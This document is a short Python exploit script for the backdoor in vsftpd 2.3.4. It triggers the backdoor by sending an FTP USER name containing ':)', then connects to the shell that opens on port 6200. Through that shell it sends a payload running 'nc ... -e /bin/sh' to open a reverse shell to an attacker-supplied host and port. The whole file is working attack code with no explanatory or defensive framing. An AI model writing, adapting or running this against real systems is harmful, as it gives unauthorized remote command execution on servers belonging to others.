import sys, socket

rhost = sys.argv[1]
lhost = sys.argv[2]
lport = sys.argv[3]
port = 21

cmd = "nc " + lhost + " " + lport + " -e /bin/sh"
payload = "nohup " + cmd + " >/dev/null 2>&1" + "\n"

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    client.connect((rhost,6200))
    print("Backdoor already open")
    client.send("id\n")
    resp = client.recv(1024)
    print(resp)
    client.send(payload)
except:
    print("Connecting to Host")
client.connect((rhost,port))
banner = client.recv(1024)
print(banner)
client.send("USER 1234:)\r\n")
resp = client.recv(1024)
print(resp)
client.send("PASS 1234\r\n")
client.close()
backdoor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("Connecting to backdoor")
backdoor.connect((rhost,6200))
print("Connected to backdoor")
backdoor.send("id\n")
resp = backdoor.recv(1024)
print(resp)
backdoor.send(payload)
backdoor.close()
